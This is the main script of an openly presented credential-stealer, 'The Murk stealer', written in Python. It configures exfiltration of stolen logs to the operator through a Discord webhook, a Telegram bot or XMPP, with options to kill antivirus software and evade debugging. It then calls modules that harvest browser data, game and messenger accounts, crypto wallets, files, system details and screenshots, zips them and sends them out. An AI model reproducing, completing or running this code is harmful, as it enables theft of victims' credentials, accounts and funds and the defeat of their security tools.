#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

enableFileGrubber = False #enable file grabber
oneStart = False #enable this if you want logs to come only from unique computers
avKiller = False #enable antiviruses killer

sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
# You can write your address for sending logs here
discordData = ["url of your WebHook","name of that WebHook"]
TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
xmppData = ["jabberid","jabberpassword","jabberreceiver"]


# do not change the value of the variables below
name = ''
password = ''
np = []
dataForMassageSYS =[]
dataForMassageBrowsers =[]
dataForMassageOther =[]
dataForMassageWallets =[]
dataForMassageFiles = []


from scripts.manager import make_folder
from scripts.system import system_info
from scripts.system import programs
from scripts.system import photos
from scripts.games import Minecraft
from scripts.messengers import telegram
from scripts.manager import send 
from scripts.manager import clear
from scripts.games import steam
from scripts.messengers import discord
from scripts.games import epicGames
from scripts.messengers import whatsapp
from scripts.games import roblox
from scripts.wallets import wallets
from scripts.messengers import skype
from scripts.games import BattleNET
from scripts.games import Uplay
from scripts.manager import ending
from scripts.messengers import viber
from scripts.browsers.browsers import Browsers
from scripts.files import Files_txt
from scripts.files import file_grubber
from scripts.secure.antiDebug import AntiDebug

AntiDebug(oneStart,avKiller)
make_folder.makeFolders(enableFileGrubber,oneStart)
if enableFileGrubber:
    dataForMassageFiles= file_grubber.Grab(dataForMassageFiles)
Browsers()
dataForMassageBrowsers = Browsers.Return()
dataForMassageOther = epicGames.Epic(dataForMassageOther)
dataForMassageOther = Uplay.Ubisoft(dataForMassageOther)
dataForMassageOther = Minecraft.Minecraft(dataForMassageOther)
dataForMassageOther = roblox.roblox(dataForMassageOther)
dataForMassageOther = steam.Steam(dataForMassageOther)
dataForMassageOther =BattleNET.BattleNet(dataForMassageOther)
dataForMassageOther = skype.skype(dataForMassageOther)
dataForMassageOther = telegram.Telegram(dataForMassageOther)
dataForMassageOther = viber.Viber(dataForMassageOther)
dataForMassageOther = discord.Discord(dataForMassageOther)
dataForMassageOther = whatsapp.WhatsApp(dataForMassageOther)
dataForMassageWallets = wallets.Wallets(dataForMassageWallets)
dataForMassageSYS = system_info.SystemInfo(dataForMassageSYS)
if not enableFileGrubber:
    Files_txt.TxtSteal()
programs.Programs()
photos.Screenshot()



try:
    np = clear.makemeZip(name,password,np)
    print(np)
    pass
except Exception as e:
    print(e)
try:
    send.Send(sendType,np,dataForMassageSYS,dataForMassageBrowsers,dataForMassageOther,dataForMassageWallets,dataForMassageFiles,discordData,TelegramData,xmppData)
except Exception as e:
    print(e)
ending.End()